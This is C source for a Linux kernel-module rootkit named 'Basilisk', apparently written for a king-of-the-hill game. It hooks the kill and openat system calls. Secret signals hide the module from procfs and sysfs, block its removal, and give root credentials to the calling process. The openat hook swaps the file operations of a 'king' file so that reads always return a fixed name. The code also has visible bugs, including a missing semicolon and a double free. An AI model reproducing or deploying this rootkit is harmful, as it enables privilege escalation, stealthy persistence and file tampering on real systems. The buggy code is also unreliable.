#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/version.h>
#include <linux/file.h>
#include <linux/path.h>
#include <linux/err.h>
#include <linux/string.h>
#include <linux/types.h>
#include <linux/fs.h>
#include <linux/path.h>
#include <linux/namei.h>
#include <linux/rwlock.h>

#include "include/ftrace_helper.h"
#include "include/stealth_helper.h"


// Macros for the kill hook commands (documented at the kill_hook)
#define SIG_HIDE 63
#define SIG_ROOT 64
#define SIG_PROTECT 32
#define SIG_GODMODE 38

// Macros for protecting king.txt
#define KING_FILENAME "/home/vagrant/king.txt" // Path to king file
#define KING_FILENAME_LEN strlen(KING_FILENAME)

#define KING "SKELLY\n" // King
#define KING_LEN strlen(KING)

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Skelly");
MODULE_DESCRIPTION("Basilisk LKM Rootkit");
MODULE_VERSION("2.0");

#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
#define PTREGS_SYSCALL_STUBS 1
#endif

static short hidden = 0; // toggle for hiding from sysfs/procfs
static short protected = 0; // toggle for inc/decrementing module ref count (un/protecting it from being removed)

static struct file_operations *king_fops;
static DEFINE_RWLOCK(king_fops_lock);

/* Cleanup the king_fops struct*/
static void cleanup_fops(void) {
    kfree(king_fops); 
    king_fops = NULL; // prevent dangling pointer access
}

/*
Hook for the read system call. Reads KING into buf and updates the pos pointer.
WARNING: This function is to be hooked in the f_op struct of the target file.
            Hooking it elsewhere will most definetely cause damage to the system.
*/
static ssize_t hook_read(struct file *file, char __user *buf, size_t count, loff_t *pos)
{
    int read_len; 
    if (*pos == 0 && count >= KING_LEN) { // If pos at start of file, *read* our KING name
        read_len = KING_LEN;
        if (copy_to_user(buf, KING, read_len)) {
            pr_alert("basilisk: copy_to_user failed\n");
            return -EFAULT;
        }
	    *pos += read_len; // Use the file offset to handle subsequent reads 
        return read_len;
    } else {
	    return 0; // Return EOF
    }
}

/* Checks if path doesn't match KING_FILENAME and return immediately*/
static long is_bad_path(const char *full_path) {
    if (strncmp(full_path, KING_FILENAME, KING_FILENAME_LEN) != 0) {
        return 1;
    }
    return 0;
}

/* Checks if file descriptor (fd) is standard (STDOUT, STDERR, STDIN)*/
static long is_bad_fd(const int fd) {
    if (fd < 3) { // 0, 1, 2
        return 1;
    }
    return 0;
}
/* 
Chains kern_path and d_path to resolve the final filename from a path (filename) is pointing to. 
WARNING: Callers should use full_path, not resolved_path, to use the name! 
*/
static long resolve_filename(const char __user *filename, char *resolved_path, char **full_path) {
    char kfilename[PATH_MAX];
    struct path path;
    long error;

    error = strncpy_from_user(kfilename, filename, PATH_MAX);
    if (error < 0) {
        pr_err("basilisk: failed to copy string from user space: error code %ld\n", error);
        return error; 
    }

    error = kern_path(kfilename, LOOKUP_FOLLOW, &path);
    if (error) {
        return error;
    }

    *full_path = d_path(&path, resolved_path, PATH_MAX);
    if (IS_ERR(*full_path)) {
        path_put(&path);
        return PTR_ERR(*full_path);
    }

    error = is_bad_path(*full_path); // check if full_path matches KING_FILENAME
    if (error) {
        return error; 
    }

    path_put(&path);
    kfree(resolved_path);

    return 0;
}

/* Poisons the file operations structures of given fd to use hook_read as the read syscall */
static long handle_fops_poisoning(int fd, const char *full_path) {
    struct file *file;

    file = fget(fd);
    if (!file) {
        pr_err("basilisk: failed to get file structure from file descriptor\n");
        return -1;
    }

    /* Lazy initialization of king_fops */
    read_lock(&king_fops_lock); 
    if (!king_fops) {
        read_unlock(&king_fops_lock);
        write_lock(&king_fops_lock);
        
        king_fops = kmemdup(file->f_op, sizeof(*file->f_op), GFP_KERNEL);
        if (king_fops) {
            king_fops->read = hook_read;
        } else {
            pr_alert("Failed to allocate memory for new file_operations\n");
            write_unlock(&king_fops_lock);
            return -1;
        }
        write_unlock(&king_fops_lock);

    } else {
        read_unlock(&king_fops_lock); // Release read lock in case of already initialized king_fops
    }

    /* *Poison* targets file fops */
    write_lock(&king_fops_lock); 
    file->f_op = king_fops;
    write_unlock(&king_fops_lock);
    
    fput(file);
    return fd;
}

/*
sys_openat hook. 
Resolves the filename from the file descriptor and poisons its file operations struct if it matches our target file.
Otherwise it returns the original openat syscall.
*/
#ifdef PTREGS_SYSCALL_STUBS
static asmlinkage long (*orig_openat)(const struct pt_regs *);

static asmlinkage long hook_openat(const struct pt_regs *regs)
{

    const char __user *filename = (char *)regs->si;
    int flags = regs->dx;
    umode_t mode = regs->r10;

    int fd;
    char *full_path;
    char *resolved_path;
    long error;

    resolved_path = kmalloc(PATH_MAX, GFP_KERNEL);
    if (!resolved_path) {
        pr_err("basilisk: kmalloc failed");
	    return orig_openat(regs); // Return real sys_openat without delay 
    }

    /* resolve filename from file descriptor */    
    error = resolve_filename(filename, resolved_path, &full_path);
    if (error) {
        kfree(resolved_path) // free resolved_path
        return orig_openat(regs);
    }
    /* poison fops sturct if path matches our target file and fd is not standard */
    fd = orig_openat(regs);

    error = is_bad_fd(fd); // check if fd is not standard
    if (error) {
        kfree(resolved_path);
        return orig_openat(regs);
    }

    error = handle_fops_poisoning(fd, full_path);
    if (error == fd) { // fops poisoning succeeded 
        kfree(resolved_path);
        return fd;
    }
    kfree(resolved_path);
    return orig_openat(regs);
}
#else
static asmlinkage long (*orig_openat)(int dfd, const char __user *filename, int flags, umode_t mode);

static asmlinkage long hook_openat(int dfd, const char __user *filename, int flags, umode_t mode)
{
    int fd;
    char *full_path;
    char *resolved_path;
    long error;

    resolved_path = kmalloc(PATH_MAX, GFP_KERNEL);
    if (!resolved_path) {
        pr_err("basilisk: kmalloc failed");
	    return orig_openat(dfd, filename, flags, mode); // Return real sys_openat without delay 
    }

    /* resolve filename from file descriptor */    
    error = resolve_filename(filename, resolved_path, &full_path);
    if (error) {
        kfree(resolved_path); // free resolved_path
        return orig_openat(dfd, filename, flags, mode);
    }
    /* poison file operations of our new file descriptor */
    fd = orig_openat(dfd, filename, flags, mode); 
    
    error = is_bad_fd(fd); // check if fd is not standard
    if (error) {
        kfree(resolved_path);
        return orig_openat(dfd, filename, flags, mode);
    }

    error = handle_fops_poisoning(fd, full_path);
    if (error == fd) { // fops poisoning succeeded 
        kfree(resolved_path);
        return fd;
    }
    kfree(resolved_path);
    return orig_openat(dfd, filename, flags, mode);
}
#endif

/*
Kill syscall hook.
Intercepts signals to communicate with the adversary.

SIG_HIDE calls handle_lkm_hide (hide/show from sysfs/procfs)
SIG_PROTECT calls handle_lkm_protect (increase/decrease the module ref count)
SIG_GODMODE calls handle_lkm_hide AND handle_lkm_protect
SIG_ROOT calls set_root (give root to the caller process)

Otherwise it calls the original kill syscall.
*/

#ifdef PTREGS_SYSCALL_STUBS
static asmlinkage long (*orig_kill)(const struct pt_regs *);

asmlinkage int hook_kill(const struct pt_regs *regs)
{ 
 /* declare required prototypes (defined below, for clarity) */
    void set_root(void);
    void handle_lkm_hide(void);
    
    int sig = regs->si;

    switch (sig) {
        case SIG_HIDE:
            handle_lkm_hide();
            break;

        case SIG_PROTECT:
            handle_lkm_protect(&protected);
            break;
        
        case SIG_GODMODE:
            handle_lkm_hide();
            handle_lkm_protect(&protected);
            break;

        case SIG_ROOT:
            pr_info("basilisk: giving root...\n");
            set_root();
            break;

        default:
            return orig_kill(regs);
    }
    return 0;
}

#else
/* This is the old way of declaring a syscall hook */
static asmlinkage long (*orig_kill)(pid_t pid, int sig);

asmlinkage int hook_kill(pid_t pid, int sig)
{
    void set_root(void);
    void handle_lkm_hide(void);

    switch (sig) {
        case SIG_HIDE:
            handle_lkm_hide();
            break;

        case SIG_PROTECT:
            handle_lkm_protect(&protected);
            break;
        
        case SIG_GODMODE:
            handle_lkm_hide();
            handle_lkm_protect(&protected);
            break;

        case SIG_ROOT:
            pr_info("basilisk: giving root...\n");
            set_root();
            break;

        default:
            return orig_kill(pid, sig);
    }
    return 0;
}
#endif

/*
Helper function to handle hiding/showing our LKM 
*/
void handle_lkm_hide(void)
{
    if(!hidden) {
        pr_info("basilisk: hiding kernel module\n");
        proc_hide();
        sys_hide();
    } else {
        pr_info("basilisk: showing kernel module\n");
        proc_show();
        sys_show();
    }
    hidden = !hidden; // toggle `hidden` switch
}

void set_root(void)
{
    struct cred *root;
    root = prepare_creds();

    if (root == NULL)
            return;

    // Set credentials to root
    root->uid.val = root->gid.val = 0;
    root->euid.val = root->egid.val = 0;
    root->suid.val = root->sgid.val = 0;
    root->fsuid.val = root->fsgid.val = 0;

    commit_creds(root);
}

/* Declare the struct that ftrace needs to hook the syscall */
static struct ftrace_hook hooks[] = {
    HOOK("sys_kill", hook_kill, &orig_kill),
    HOOK("sys_openat", hook_openat, &orig_openat),
};

/* Module initialization function */
static int __init basilisk_init(void)
{
    int err;
    
    init_this_kobj(); // initialize this_kobj utility struct in stealth_helper.h
    /* Hook the syscall and print to the kernel buffer */
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if(err)
        return err;

    pr_info("basilisk: loaded\n");
    return 0;
}

static void __exit basilisk_exit(void)
{
    cleanup_fops(); // free king_fops
    /* Unhook and restore the syscalls */
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    printk(KERN_INFO "basilisk: unloaded\n");
}

module_init(basilisk_init);
module_exit(basilisk_exit);